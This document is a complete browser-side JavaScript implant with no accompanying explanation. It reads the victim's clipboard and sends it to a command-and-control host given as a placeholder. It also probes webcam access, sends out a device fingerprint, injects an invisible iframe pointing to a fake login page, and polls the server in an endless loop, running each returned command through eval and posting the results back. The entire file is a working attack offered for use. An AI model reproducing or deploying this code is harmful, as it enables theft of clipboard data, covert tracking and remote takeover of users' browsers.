(async () => {
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const C2 = "https://YOUR_NGROK_URL";

  try {
    const text = await navigator.clipboard.readText();
    fetch(`${C2}/cliplog`, { method: "POST", body: text, headers: { "Content-Type": "text/plain" } });
  } catch {}

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    fetch(`${C2}/camlog`, { method: "POST", body: "🎥 Access", headers: { "Content-Type": "text/plain" } });
    stream.getTracks().forEach(track => track.stop());
  } catch {
    fetch(`${C2}/camlog`, { method: "POST", body: "❌ Blocked", headers: { "Content-Type": "text/plain" } });
  }

  const fingerprint = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    cores: navigator.hardwareConcurrency,
    memory: navigator.deviceMemory,
    lang: navigator.language,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: `${screen.width}x${screen.height}`
  };
  fetch(`${C2}/fingerprint`, {
    method: "POST", body: JSON.stringify(fingerprint),
    headers: { "Content-Type": "application/json" }
  });

  const iframe = document.createElement("iframe");
  iframe.src = "https://example.com/fake-login";
  iframe.style = "width:1px;height:1px;opacity:0;position:absolute;top:0;left:0;";
  document.body.appendChild(iframe);

  fetch("https://ROGUE_C2/join", {
    method: "POST",
    body: JSON.stringify({ id: navigator.userAgent }),
    headers: { "Content-Type": "application/json" }
  });

  while (true) {
    try {
      const res = await fetch(`${C2}/command`);
      const command = await res.text();
      if (command && command !== "noop") {
        const result = await eval(command);
        fetch(`${C2}/result`, {
          method: "POST", body: result?.toString(),
          headers: { "Content-Type": "text/plain" }
        });
      }
    } catch {}
    await sleep(5000);
  }
})();
